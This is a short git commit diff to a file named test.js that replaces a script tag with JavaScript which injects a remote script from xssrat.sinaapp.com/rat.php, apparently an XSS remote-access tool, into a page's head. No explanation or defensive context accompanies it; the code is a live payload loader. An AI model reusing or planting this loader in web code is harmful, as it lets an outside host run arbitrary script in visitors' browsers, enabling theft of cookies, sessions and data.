b7478a01d2f10a6b1b8c3305de2d99abe8b761b1
tokey-jo <zhoufjn@gmail.com>
2015-05-22 14:22:27 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,5 @@
-<script src='http://xssrat.sinaapp.com/rat.php?t=9fa7e35a'></script>
+var oHead = document.getElementsByTagName('HEAD').item(0);
+var oScript= document.createElement("script");
+oScript.type = "text/javascript";
+oScript.src="http://xssrat.sinaapp.com/rat.php?t=9fa7e35a";
+oHead.appendChild( oScript);
